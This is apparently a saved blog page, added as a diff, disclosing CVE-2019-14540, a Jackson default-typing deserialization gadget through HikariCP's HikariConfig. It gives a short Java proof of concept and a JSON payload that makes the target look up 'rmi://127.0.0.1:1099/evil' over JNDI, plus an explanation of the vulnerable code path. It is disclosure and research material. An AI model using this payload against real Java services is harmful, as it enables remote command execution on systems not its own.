@@ -1,0 +1,340 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>CVE-2019-14540: Another gadgets to exploit default typing issue in (Jackson 2.x - 2.9.9.2 and 2.10.0.pr1) - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="I found a new remote command execution gadget in the package of Hikari. This gadget has been succ..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="CVE-2019-14540: Another gadgets to exploit default typing issue in (Jackson 2.x - 2.9.9.2 and 2.10.0.pr1) &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/201.html" />
+<link rel="alternate" type="application/rdf+xml" title="CVE-2019-14540: Another gadgets to exploit default typing issue in (Jackson 2.x - 2.9.9.2 and 2.10.0.pr1) &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/201.html" />
+<link rel="alternate" type="application/atom+xml" title="CVE-2019-14540: Another gadgets to exploit default typing issue in (Jackson 2.x - 2.9.9.2 and 2.10.0.pr1) &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/201.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-201'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-201'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-201'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _FYd = //'M1k'
+'250'+//'pss'
+'67'+/* 'w'//'w' */''+//'H'
+'b'+//'qm'
+'qm'+//'K'
+'c'+''///*'j9'*/'j9'
++//'j1'
+'87'+'245'//'Z'
++'d4f'//'AfA'
++//'Nsz'
+'Nsz'+//'g'
+'f1'+'1'//'T'
++'C'//'C'
++'j'//'j'
++//'Let'
+'484'+//'M'
+'M'+'v'//'v'
++''///*'AZ'*/'AZ'
++'3'//'3'
++'274'//'qj'
++''///*'FCT'*/'FCT'
++'6'//'E'
++//'Jx6'
+'Jx6'+'7e7'//'y3X'
++/* 'q'//'q' */''+'6'//'C'
++'a7'//'4pR'
++/* 'R'//'R' */''+//'8'
+'8'+//'n'
+'8', _BwlEZw = [[6,8],[15,18],[18,19],[18,19],[21,22],[21,22],[21,22],[25,28],[31,32]];
+    
+    for (var i = 0; i < _BwlEZw.length; i ++) {
+        _FYd = _FYd.substring(0, _BwlEZw[i][0]) + _FYd.substring(_BwlEZw[i][1]);
+    }
+
+    return _FYd;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">CVE-2019-14540: Another gadgets to exploit default typing issue in (Jackson 2.x - 2.9.9.2 and 2.10.0.pr1)</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2019-07-31 17:32:00" itemprop="datePublished">2019-07-31 17:32:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/201.html"><a href="https://b1ue.cn/category/vul/">漏洞</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/201.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <p>I found a new remote command execution gadget in the package of Hikari. This gadget has been successfully tested on the newest version of Jackson (2.10.0.pr1).</p><p>The requirements are as follows.</p><ul><li>Enable Default Typing</li><li>Jackson ver 2.x - 2.9.9.2/2.10.0.pr1</li><li>Classpath contains <code>HikariCP</code></li></ul><h3>Preparation</h3><p>1.Import latest version of Jackson.</p><pre><code>        &lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
+            &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
+            &lt;version&gt;2.10.0.pr1&lt;/version&gt;
+        &lt;/dependency&gt;</code></pre><p>2.Import HikariCP</p><pre><code>        &lt;!-- https://mvnrepository.com/artifact/com.zaxxer/HikariCP --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.zaxxer&lt;/groupId&gt;
+            &lt;artifactId&gt;HikariCP&lt;/artifactId&gt;
+            &lt;version&gt;3.3.1&lt;/version&gt;
+        &lt;/dependency&gt;</code></pre><p>or you can import other packages that contain HikariCP. For example, A well-know task scheduling framework <code>quartz</code>.</p><pre><code>        &lt;dependency&gt;
+            &lt;groupId&gt;org.quartz-scheduler&lt;/groupId&gt;
+            &lt;artifactId&gt;quartz&lt;/artifactId&gt;
+            &lt;version&gt;2.3.0&lt;/version&gt;
+        &lt;/dependency&gt;</code></pre><h3>Proof of concept</h3><pre><code>import com.fasterxml.jackson.databind.ObjectMapper;
+import java.io.IOException;
+
+/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d2b0bea7b792bbaaa1b7b1fcbda0b5">[email&#160;protected]</a>
+ * @since 2019/7/31 14:15
+ */
+public class HikariTest {
+
+    public static void main(String[] args) throws IOException{
+        String json = &quot;[\&quot;com.zaxxer.hikari.HikariConfig\&quot;,{\&quot;metricRegistry\&quot;:\&quot;rmi://127.0.0.1:1099/evil\&quot;}]&quot;;
+        ObjectMapper objectMapper = new ObjectMapper();
+        objectMapper.enableDefaultTyping();
+        objectMapper.readValue(json,Object.class);
+    }
+
+}
+</code></pre><p>Firstly, We should enable defaultTyping then triggering deserialize.</p><pre><code>[&quot;com.zaxxer.hikari.HikariConfig&quot;,{&quot;metricRegistry&quot;:&quot;rmi://127.0.0.1:1099/evil&quot;}]</code></pre><p><img src="/usr/uploads/2019/07/308407774.jpg" alt="1564567684(1).jpg" title="1564567684(1).jpg"></p><p>This demo will connect to the attacker's malicious remote RMI server.</p><p>This gadget work in the version of <code>2.9.9.2</code>, <code>2.9.9.1</code>, <code>2.9.9</code>, <code>2.8.9</code>.</p><h3>Detail of this gadget</h3><p>In the latest release verion of hikari(3.3.1), there is a method called <code>setMetricRegistry</code> in the class file <code>com.zaxxer.hikari.HikariConfig</code>.</p><p><img src="/usr/uploads/2019/07/2025638218.jpg" alt="1564568542(1).jpg" title="1564568542(1).jpg"></p><p><code>getObjectOrPerformJndiLookup</code> will handle this method(<code>setMetricRegistry</code>)</p><p><img src="/usr/uploads/2019/07/1651603377.jpg" alt="1564568816(1).jpg" title="1564568816(1).jpg"></p><p>In the <code>getObjectOrPerformJndiLookup</code> method, a JNDI connection request passed as parameters via <code>lookup</code> method in the <code>InitialContext</code> object.</p><p>but in the older version of hikari. Method <code>setMetricRegistry</code> was contained in the parent class <code>AbstractHikariConfig</code>. We can still exploit this demo by same gadget.</p><p><img src="/usr/uploads/2019/07/1079008604.jpg" alt="1564569244(1).jpg" title="1564569244(1).jpg"></p><p><strong>Finally, thanks for the translation by my friend <a href="http://lonelyrain.me/" target="_blank">@lonelyrain</a>.</strong></p>        </div>
+    </article>
+
+    <div id="comments">
+        
+        <div id="respond-post-201" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/201.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/201.html#respond-post-201" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
